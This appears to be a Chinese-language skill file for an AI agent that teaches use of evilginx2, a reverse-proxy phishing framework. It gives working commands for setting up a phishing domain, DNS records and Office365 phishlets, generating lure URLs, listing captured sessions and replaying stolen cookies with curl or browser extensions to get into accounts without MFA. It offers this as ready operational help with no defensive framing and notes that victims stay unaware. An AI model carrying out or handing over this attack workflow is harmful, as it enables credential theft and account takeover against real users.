---
name: evilginx2
description: >
  此技能适用于用户询问关于 "evilginx2"、"通过钓鱼绕过双因素认证 (2FA)"、"捕获会话令牌"、"执行对手中间人 (AiTM) 攻击"、"搭建反向代理钓鱼站点" 的场景。通过代理真实登录页面捕获会话 Cookie 并绕过 MFA/2FA 的中间人钓鱼代理框架。
---

# Evilginx2

反向代理钓鱼框架，捕获会话 Cookie — 可绕过 OTP、推送通知和 FIDO2 MFA。

## 原理

与 GoPhish（克隆页面）不同，Evilginx2 **代理真实站点**。受害者与真实服务交互；Evilginx2 在传输过程中捕获已认证的会话 Cookie 和凭据。

## 快速开始

```bash
# 启动 evilginx2
evilginx2

# 在 evilginx shell 内：
config domain phish.example.com
config ip 1.2.3.4
phishlets hostname office365 login.phish.example.com
phishlets enable office365
lures create office365
lures get-url 0
```

## DNS 配置要求

启动前，为你的域名添加 DNS 记录：
```
A    @          1.2.3.4       (VPS IP)
A    *          1.2.3.4       (phishlet 通配符)
NS   ns1        1.2.3.4
NS   ns2        1.2.3.4
```

## 核心命令

| 命令 | 说明 |
|---------|-------------|
| `config domain <domain>` | 设置操作域名 |
| `config ip <ip>` | 设置钓鱼服务器 IP |
| `phishlets` | 列出可用 phishlet |
| `phishlets hostname <name> <hostname>` | 为 phishlet 分配主机名 |
| `phishlets enable <name>` | 启用 phishlet（启动代理并获取证书） |
| `phishlets disable <name>` | 禁用 phishlet |
| `lures create <phishlet>` | 创建诱饵（唯一钓鱼 URL） |
| `lures get-url <id>` | 获取钓鱼 URL |
| `lures` | 列出所有诱饵 |
| `sessions` | 列出捕获的会话 |
| `sessions <id>` | 显示会话详情（令牌、凭据） |

## 可用 Phishlet

内置：`office365`、`google`、`linkedin`、`facebook`、`outlook`、`github`、`okta`、`discord` 等。

自定义 phishlet 可添加到 `~/.evilginx/phishlets/`。

## 会话捕获流程

```
1. 受害者点击诱饵 URL
2. Evilginx2 代理真实服务 → TLS 在 Evilginx2 处终止
3. 受害者完成认证（包括 MFA）
4. Evilginx2 捕获：Cookie、凭据、令牌
5. 将受害者重定向到合法站点（无感知）
6. 攻击者在浏览器中使用捕获的 Cookie（无需 MFA）
```

## 使用捕获的会话

```bash
# 在 evilginx 内
sessions 1    # 显示会话 1 — 复制认证令牌/Cookie

# 使用 EditThisCookie 或 Cookie-Editor 扩展将 Cookie 导入浏览器
# 或使用 curl：
curl -H "Cookie: <captured_cookie>" https://target.service.com/api/...
```

## 资源

| 文件 | 何时加载 |
|------|--------------|
| `references/phishlets.md` | Phishlet YAML 语法、自定义 phishlet 创建、绕过检测 |
